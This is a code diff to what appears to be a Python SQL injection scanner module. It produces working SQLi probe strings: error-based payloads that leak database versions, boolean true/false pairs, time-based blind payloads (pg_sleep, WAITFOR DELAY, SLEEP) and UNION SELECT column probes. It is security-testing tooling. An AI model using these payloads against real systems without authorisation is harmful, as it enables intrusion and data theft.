@@ -1,66 +1,97 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
-"""Minimal, context-aware SQLi probe payloads."""
+"""Context-aware SQLi probe payloads."""
 
 from __future__ import annotations
 
 from typing import List, Tuple
 
+from .injection_context import InjectionContext
 
-def error_probes(original: str) -> List[Tuple[str, str]]:
+
+def _string_boolean_fragments(ctx: InjectionContext) -> Tuple[str, str]:
+    q = ctx.quote or "'"
+    c = ctx.comment
+    if ctx.paren_close:
+        return (
+            f" AND ({q}1{q}={q}1{c}".rstrip(),
+            f" AND ({q}1{q}={q}2{c}".rstrip(),
+        )
+    return (
+        f" AND {q}1{q}={q}1{c}".rstrip(),
+        f" AND {q}1{q}={q}2{c}".rstrip(),
+    )
+
+
+def error_probes(ctx: InjectionContext) -> List[Tuple[str, str]]:
     """Return (payload, label) pairs for error-based detection."""
-    base = original if original else "1"
+    base = ctx.original or "1"
+    if ctx.numeric:
+        return [
+            (f"{base}'", "numeric stray quote"),
+            (f"{base} AND 1=CONVERT(int,@@version)", "mssql convert"),
+            (f"{base} AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))", "mysql extractvalue"),
+        ]
+    q = ctx.quote or "'"
+    close = f"{base}{q}{ctx.paren_close}"
     return [
-        (f"{base}'", "single-quote"),
-        (f'{base}"', "double-quote"),
-        (f"{base}`", "backtick"),
-        (f"{base}' AND '1'='2", "AND false"),
+        (close, "quote close"),
+        (ctx.append_sql(f" AND {q}1{q}={q}2"), "AND false string"),
+        (ctx.append_sql(f" OR {q}x{q}={q}y"), "OR mismatch"),
     ]
 
 
-def boolean_probes(original: str) -> Tuple[Tuple[str, str], Tuple[str, str]]:
+def boolean_probes(ctx: InjectionContext) -> Tuple[Tuple[str, str], Tuple[str, str]]:
     """Return ((true_payload, true_label), (false_payload, false_label))."""
-    base = original if original else "1"
+    if ctx.numeric:
+        base = ctx.original or "1"
+        return (
+            (f"{base} AND 1=1", "numeric AND 1=1"),
+            (f"{base} AND 1=2", "numeric AND 1=2"),
+        )
+    true_frag, false_frag = _string_boolean_fragments(ctx)
     return (
-        (f"{base} AND 1=1", "AND 1=1"),
-        (f"{base} AND 1=2", "AND 1=2"),
+        (ctx.append_sql(true_frag), "AND true string"),
+        (ctx.append_sql(false_frag), "AND false string"),
     )
 
 
 def boolean_numeric_probes(original: str) -> Tuple[Tuple[str, str], Tuple[str, str], str]:
-    """Numeric-context boolean probes; returns (true, false, numeric_base)."""
+    """Legacy numeric probes; returns (true, false, numeric_base)."""
     numeric_base = original.strip() if original.strip().isdigit() else "1"
-    return (
-        (f"{numeric_base} AND 1=1", "numeric AND 1=1"),
-        (f"{numeric_base} AND 1=2", "numeric AND 1=2"),
-        numeric_base,
-    )
+    ctx = InjectionContext(original=numeric_base, numeric=True, quote="")
+    true_p, false_p = boolean_probes(ctx)
+    return true_p, false_p, numeric_base
 
 
-def time_probe(original: str, delay: float, dbms: str = "") -> Tuple[str, str]:
+def time_probe(ctx: InjectionContext, delay: float, dbms: str = "") -> Tuple[str, str]:
     """Return (payload, label) for time-based blind detection."""
-    base = original if original else "1"
     delay_i = max(2, int(delay))
     db = (dbms or "").lower()
 
     if db == "postgresql":
         inner = f"(SELECT CASE WHEN (1=1) THEN pg_sleep({delay_i}) ELSE pg_sleep(0) END)"
-        return (f"{base}' AND {inner}-- ", f"pg_sleep({delay_i})")
+        payload = ctx.append_sql(f" AND {inner}{ctx.comment}")
+        return payload, f"pg_sleep({delay_i})"
     if db == "mssql":
-        return (f"{base}'; WAITFOR DELAY '00:00:0{delay_i}'-- ", f"WAITFOR DELAY {delay_i}s")
+        payload = ctx.append_sql(f"; WAITFOR DELAY '00:00:0{delay_i}'{ctx.comment}")
+        return payload, f"WAITFOR DELAY {delay_i}s"
     if db == "sqlite":
-        return (f"{base}' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END)-- ", "sqlite heavy")
+        payload = ctx.append_sql(
+            f" AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 0 END){ctx.comment}"
+        )
+        return payload, "sqlite heavy"
 
-    return (f"{base}' AND SLEEP({delay_i})-- ", f"SLEEP({delay_i})")
+    payload = ctx.append_sql(f" AND SLEEP({delay_i}){ctx.comment}")
+    return payload, f"SLEEP({delay_i})"
 
 
-def union_probe(original: str, columns: int = 2) -> Tuple[str, str]:
-    """Light UNION probe (used only after error confirmation)."""
-    base = original if original else "1"
-    nulls = ",".join(["NULL"] * max(1, columns))
-    marker = "0x4b535049"  # 'KSPI' hex marker
-    return (
-        f"{base}' UNION SELECT {marker},{marker}-- ",
-        f"UNION SELECT x{max(1, columns)}",
-    )
+def union_probe(ctx: InjectionContext, columns: int) -> Tuple[str, str]:
+    """UNION SELECT with *columns* placeholders and a reflected hex marker."""
+    cols = max(1, int(columns))
+    parts = ["NULL"] * cols
+    parts[0] = "0x4b535049"  # 'KSPI' hex marker
+    select_list = ",".join(parts)
+    payload = ctx.append_sql(f" UNION SELECT {select_list}{ctx.comment}")
+    return payload, f"UNION {cols} cols"
